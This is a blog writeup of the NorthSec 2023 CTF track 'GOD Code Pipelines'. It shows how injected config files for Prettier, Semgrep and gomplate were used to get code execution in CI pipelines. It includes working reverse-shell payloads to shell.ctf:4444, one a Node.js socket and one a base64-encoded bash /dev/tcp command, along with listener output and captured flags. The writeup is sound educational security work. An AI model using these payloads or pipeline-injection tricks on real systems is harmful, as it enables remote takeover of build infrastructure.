---
layout: post
title: NorthSec 2023 Writeup - GOD Code Pipelines
date: 2023-05-22
type: post
tags:
- Writeup
- Hacking
- NorthSec
- CTF
permalink: /2023/05/NorthSec/GODCodePipelines
img: 2023/05/NorthSec/GODCodePipelines/Description.png
---

In this challenge, we were given three Git repositories to clone. Each had a different pipeline that we had to exploit in order to get the flags. For each repository, the main branch and the file containing the action to run were protected against changes.

```
GOD code procedures and pipelines:

Password: git for all.
```



## 1 - Code formatting

![Code Formatting](/assets/images/2023/05/NorthSec/GODCodePipelines/CodeFormatting.png "Code Formatting")

The first repository was using [Prettier](https://prettier.io/) to validate the code format.

The file that contained the pipeline was simply running `prettier`.

```bash
#!/usr/bin/env bash

set -ex

echo "linting changes with Prettier..."

prettier --check .
```

There was also a file called `.prettierrc.toml` that contained the configuration for `prettier`.

```ini
trailingComma = "es5"
tabWidth = 4
semi = false
singleQuote = true
```

The configuration file was also protected. But I read a little about [prettier configuration options](https://prettier.io/docs/en/configuration.html). It supports multiple options for configuration files. And the toml file was the last one in order of precedence. This meant I could create another configuration file to replace the one provided in the repository.

I create a `.prettierrc.js` configuration that had JS code to open a reverse shell on the machine that the CTF provided for these kinds of things.

```js
module.exports = {
    trailingComma: "es5",
    tabWidth: 4,
    semi: false,
    singleQuote: true,
  };
  (function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "shell.ctf", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
```

My netcat listener got the shell.

```bash
root@ctn-shell:~/www# nc -6 -klvnp 4444
Listening on :: 4444


Connection received on 9000:bbb:bbb:bb1:216:3eff:fee2:28e2 43648
ls /
bin
boot
dev
etc
flag_here_06e18b8aafa4f0fd93f9d00d024b974e
git-dir
home
lib
lib32
lib64
...

cat /flag_here_06e18b8aafa4f0fd93f9d00d024b974e
FLAG-f95265a349902769fc2e1843af2ddca5
```

## 2 - Source Code Analysis

![Source Code Analysis](/assets/images/2023/05/NorthSec/GODCodePipelines/SourceCodeAnalysis.png "Source Code Analysis")

The second challenge of the track was using [Semgrep](https://semgrep.dev/) to check the source code for security vulnerabilities.

The pipeline was reading some options from a configuration file to build the command to run `semgrep`.

```python
#!/usr/bin/env python3
import subprocess
import json
import sys

cmd = ["semgrep", "--error", "--no-rewrite-rule-ids", "--disable-version-check"]

with open(".semgrep.config.json") as f:
    config = json.load(f)

for key, value in config.items():
    if key == "format":
        cmd.append(f"--{value}")
    elif key == "config":
        cmd.extend(c for v in value for c in ["--config", v])
    elif key == "verbose":
        if value:
            cmd.append("--verbose")

proc = subprocess.run(cmd)

sys.exit(proc.returncode)
```

The default configuration was using the `emacs` format, and reading configuration from the `.semgrep` folder.

```json
{
    "format": "emacs",
    "config": [".semgrep"],
    "verbose": true
}
```

This resulted in Semgrep being run like this.

```bash
semgrep --error --no-rewrite-rule-ids --disable-version-check --emacs --config .semgrep --verbose
```

Once again, the file that ran the pipeline was protected against changes. But the configuration files were not.

I quickly found out that I could replace the `emacs` format by any other option. I tried to get the version of Semgrep that was being used.

```json
{
    "format": "version",
    "config": [".semgrep"],
    "verbose": true
}
```

When I pushed that change, I got version `0.60.0`.

With some searching, I found out about the `dangerously-allow-arbitrary-code-execution-from-rules` and `pattern-where-python` parameters that allowed [running Python code](https://semgrep.dev/docs/writing-rules/rule-syntax/#pattern-where-python). 

I modified the pipeline configuration file to pass the flag instead of the configuration.

```json
{
    "format": "dangerously-allow-arbitrary-code-execution-from-rules",
    "config": [".semgrep"],
    "verbose": false
}
```

And the Semgrep rules to execute a reverse shell to our shell box.

```bash
$ echo 'bash  -i >& /dev/tcp/shell.ctf/4444 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3Avc2hlbGwuY3RmLzQ0NDQgMD4mMSAK
```

```yaml
rules:
  - id: ban-os-system
    severity: ERROR
    languages: [python]
    message: "Usage of os.system is prohibited"
    patterns:
      - pattern: $FIELD = os.system(...)
      - pattern-where-python: "'id' in __import__('os').system('echo -n YmFzaCAgLWkgPiYgL2Rldi90Y3Avc2hlbGwuY3RmLzQ0NDQgMD4mMSAK | base64 -d | bash')"
```

I committed and pushed the changes.

```
$ git add . ; git commit -m 'test'; git push origin test
[test a6dbf67] test
 1 file changed, 1 insertion(+), 1 deletion(-)
git@semgrep.git.ctf's password: 
Enumerating objects: 7, done.
Counting objects: 100% (7/7), done.
Delta compression using up to 16 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (4/4), 944 bytes | 944.00 KiB/s, done.
Total 4 (delta 2), reused 0 (delta 0), pack-reused 0
remote: running 1 rules...
remote: Running without optimizations since running pattern-where-python rules
remote: Deprecation Notice: running with `--optimizations none` will be deprecated by 0.60.0
remote: This includes the following functionality:
remote: - pattern-where-python
remote: - taint-mode
remote: - equivalences
remote: - step-by-step evaluation output
remote: If you are seeing this notice, without specifing `--optimizations none` it means the rules
remote: you are running are using some of this functionality.
```

I got the reverse shell in my netcat listener.

```bash
root@ctn-shell:~/www# nc -6 -klvnp 4444
Listening on :: 4444
Connection received on 2602:fc62:ef:2015:1::2 47364
ehogue@thinkpad-eric:~/Hacking/Conferences/NorthSec/2023/CTF/GODCodePipeline/semgrep (test)$ ^C
root@ctn-shell:~/www# nc -6 -klvnp 4444
Listening on :: 4444
Connection received on 9000:bbb:bbb:bb1:216:3eff:fe99:ef6d 60102
bash: cannot set terminal process group (2657): Inappropriate ioctl for device
bash: no job control in this shell

git@ctn-bcotejodoin-semgrep:/tmp/tmpc9gh11yg$ ls / 
ls /
bin
boot
dev
etc
flag_here_2ce0b529283e0fa94ee85068f6973509
git-dir
home
lib
...

git@ctn-bcotejodoin-semgrep:/tmp/tmpc9gh11yg$ cat /flag_here_2ce0b529283e0fa94ee85068f6973509
<yg$ cat /flag_here_2ce0b529283e0fa94ee85068f6973509
FLAG-39760967890b1d275df6e62f017887a3
```

## 3 - Create New Release

![Create New Release](/assets/images/2023/05/NorthSec/GODCodePipelines/CreateNewRelease.png "Create New Release")

In the last challenge of the track, we had to exploit the code that generated the changelog for a project. The pipeline was using [gomplate](https://gomplate.ca/) to generate the changelog from a template and a YAML file. 

```bash
#!/usr/bin/env bash

output=`cat .ci/changelog.gomplate.md | gomplate --datasource changelog.yml`

if diff <(cat CHANGELOG.md) <(echo "$output"); then
    echo "CHANGELOG.md matches changelog.yml"
else
    echo "Error: CHANGELOG.md differs from changelog.yml"
    echo "Please regenerate CHANGELOG.md using the following command before submitting changes:"
    echo "  cat .ci/changelog.gomplate.md | gomplate --datasource changelog.yml > CHANGELOG.md"
    exit 1
fi
```

```md
# Changelog
{% raw %}
{{- with (datasource "changelog") }}
{{- range $version, $changes := .changelog }}
## {{ $version  }}
{{- range $change := $changes }}
- {{ $change  }}
{{- end }}
{{- end }}
{{- end }}
{% endraw %}
```

I thought I needed to do some Sever Side Template Injection, but the template file was protected.

From the [documentation](https://docs.gomplate.ca/config/), I saw that gomplate read configuration from the file `.gomplate.yaml` by default.

I took the example configuration that ran a bash file as a plugin.

```yaml
inputDir: in/
outputDir: out/

datasources:
  local:
    url: file:///tmp/data.json
  remote:
    url: https://example.com/api/v1/data
    header:
      Authorization: ["Basic aGF4MHI6c3dvcmRmaXNoCg=="]

plugins:
  dostuff: ./stuff.sh
```

Then, I created a template to call `dostuff` in `in/changelog.gomplate.md`.

```md
{% raw %}
# Changelog

{{ dostuff }}
{% endraw %}
```

And finally, I used the same reverse shell code in `stuff.sh`.

```bash
#!/bin/bash
echo -n YmFzaCAgLWkgPiYgL2Rldi90Y3Avc2hlbGwuY3RmLzQ0NDQgMD4mMSAK | base64 -d | bash
```

I pushed the code, got the hit on my listener, and read the flag.

```bash
$ askgod submit FLAG-f245e25dd592870ad4883a2b19651a93                                     
Congratulations, you score your team 2 points!
Message: gomplate.git.ctf RCE
```